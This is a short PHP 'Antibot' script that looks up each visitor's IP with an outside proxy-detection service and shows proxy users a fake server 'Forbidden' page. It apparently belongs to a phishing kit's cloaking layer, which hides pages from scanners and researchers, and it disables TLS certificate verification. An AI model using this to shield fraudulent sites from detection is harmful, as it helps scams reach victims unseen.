<?php 
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_proxy = $tanitatikaram['Proxy'];
$ip = getenv("REMOTE_ADDR");
if ($setting_proxy == 'on') {
if($ip == "127.0.0.1") {
}else{
$url = "https://blackbox.ipinfo.app/lookup/".$ip;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$result = $resp;
if($result == "Y") {
header('Location: Antibot/proxy.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>Antibot Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
exit();
    }
}}